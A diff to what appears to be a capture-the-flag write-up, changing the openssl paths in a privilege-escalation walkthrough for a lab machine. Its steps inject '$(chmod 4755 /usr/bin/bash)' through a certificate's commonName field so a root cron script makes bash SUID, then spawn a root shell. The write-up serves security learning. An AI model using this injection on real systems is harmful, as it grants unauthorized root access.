@@ -182,7 +182,7 @@ Pspy shows that the file /opt/renew_cert.sh is being run by root every minute.  
 
 The file /opt/renew_cert.sh shows that it’s a command to create a certificate, and it uses the .crt file we give it.  Based on this information, we can get privilege escalation to root with the following steps:
 
-Step 1: Run the command to create a certificate: openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.crt -out broscience.crt -days 1 <br>
+Step 1: Run the command to create a certificate: openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /home/bill/Certs/broscience.key -out /home/bill/Certs/broscience.crt -days 1 <br>
 Step 2: Set ‘$commonName’ to be a command to get suid on /usr/bin/bash.  When prompted to enter information for 'commonName' then enter: \$(chmod 4755 /usr/bin/bash) <br>
 Step 3: Wait a few moments until the script is run by root.  Instead of checking every few seconds to see if the script was run by root, use the command: Watch -g ls -al /usr/bin/bash <br>
 Step 4: Run the command: /usr/bin/bash -p
